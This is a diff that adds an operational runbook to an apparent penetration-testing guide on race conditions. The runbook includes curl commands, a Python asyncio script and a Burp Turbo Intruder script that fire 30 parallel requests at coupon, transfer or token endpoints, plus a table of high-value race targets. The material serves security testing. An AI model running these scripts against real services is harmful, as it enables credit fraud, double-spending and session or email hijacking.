@@ -131,6 +131,113 @@ Concurrency bugs enable duplicate state changes, quota bypass, financial abuse, 
 - Race + CSRF: trigger parallel actions from a victim to amplify effects
 - Race + Caching: stale caches re-serve privileged states after concurrent changes
 
+## Operational Runbook
+
+Once a state-changing endpoint is identified (apply coupon, redeem credit, transfer funds, redeem one-time invite), this is the canonical race-condition exploitation flow.
+
+### Step 1 — establish baseline + invariant
+
+```bash
+# What's the rule? "Coupon can be applied once per account" / "max 1 transfer per minute"
+# Capture the legitimate single-request behavior
+curl -s -X POST '<TARGET>/api/apply-coupon' \
+    -H "Authorization: Bearer $TOKEN" \
+    -d '{"code":"SAVE50"}' | jq .
+
+# Read the account state — credits / balance / status before
+BEFORE=$(curl -s '<TARGET>/api/account' -H "Authorization: Bearer $TOKEN" | jq -r '.credits')
+echo "Before: $BEFORE"
+```
+
+### Step 2 — Burp Turbo Intruder / Python concurrent baseline
+
+The single-packet attack (HTTP/2 frames sent in one TCP packet) gives the smallest possible time-of-check window:
+
+```python
+# Python (httpx + asyncio) — fire N requests in parallel
+import asyncio, httpx, time
+
+URL = "<TARGET>/api/apply-coupon"
+TOKEN = "<bearer>"
+N = 30   # number of parallel requests
+
+async def fire(client, i):
+    return await client.post(URL,
+        headers={"Authorization": f"Bearer {TOKEN}"},
+        json={"code": "SAVE50"},
+    )
+
+async def main():
+    async with httpx.AsyncClient(http2=True, timeout=15.0) as client:
+        start = time.perf_counter()
+        results = await asyncio.gather(*[fire(client, i) for i in range(N)])
+        for i, r in enumerate(results):
+            print(f"{i:02d} {r.status_code} {r.json().get('credits')}")
+
+asyncio.run(main())
+```
+
+### Step 3 — Burp Turbo Intruder (more reliable than Python for true single-packet)
+
+```python
+# Burp Turbo Intruder script
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30,
+                            requestsPerConnection=30, engine=Engine.BURP2)
+    for i in range(30):
+        engine.queue(target.req)
+    # Send all 30 in a single TCP packet (HTTP/2 frame coalescing)
+    engine.start(timeout=10)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+### Step 4 — measure the violation
+
+```bash
+# Re-read account state — did the invariant hold?
+AFTER=$(curl -s '<TARGET>/api/account' -H "Authorization: Bearer $TOKEN" | jq -r '.credits')
+echo "After 30 parallel applies: $AFTER (expected $(($BEFORE + 50)), got $AFTER)"
+```
+
+If 30 parallel "apply coupon" requests resulted in 30 × $50 credits → **TOCTOU race confirmed**.
+
+### Step 5 — common high-value races
+
+| Target | Race window | Impact |
+|---|---|---|
+| Discount/coupon apply | between "has this user used it?" check and write | Free unlimited credit |
+| Currency transfer between accounts | between balance-read and balance-write | Double-spend / overdraft |
+| One-time invitation redeem | between "is invite unused?" and "mark used" | Multiple accounts claim same invite |
+| Per-resource quota (file uploads / API calls) | between counter-read and counter-write | Bypass rate limits |
+| Password-reset token use | between "is token valid?" and "invalidate token" | Multiple sessions hijacked |
+| Account creation w/ uniqueness | between "does this email exist?" and INSERT | Duplicate accounts → split-brain |
+| Email change confirmation | between "is this confirmation token fresh?" and write | Bind email to attacker |
+
+### Step 6 — second-order race (state mutation across endpoints)
+
+When a single endpoint's race is patched but the *workflow* between two endpoints isn't atomic:
+
+```bash
+# Endpoint A: deduct balance
+# Endpoint B: credit recipient
+# If A succeeds but B fails (network blip), is the money refunded?
+# Race: fire A 30× while B is artificially slow → 30 deductions, only 1 credit
+```
+
+Test with deliberate delays / network throttling between the two phases.
+
+### Step 7 — record evidence
+
+Document:
+- Single-request baseline (proves intended behavior)
+- Parallel-request response set (status codes, returned values)
+- Final state (account balance, credit count, redemption status)
+- Calculation of impact (e.g. "30 requests × $50 = $1500 extracted in <100ms")
+
+Severity scales with extractable value. Anything that mints currency / credits / privileged tokens is **critical**.
+
 ## Testing Methodology
 
 1. **Model invariants** - Conservation of value, uniqueness, maximums for each workflow
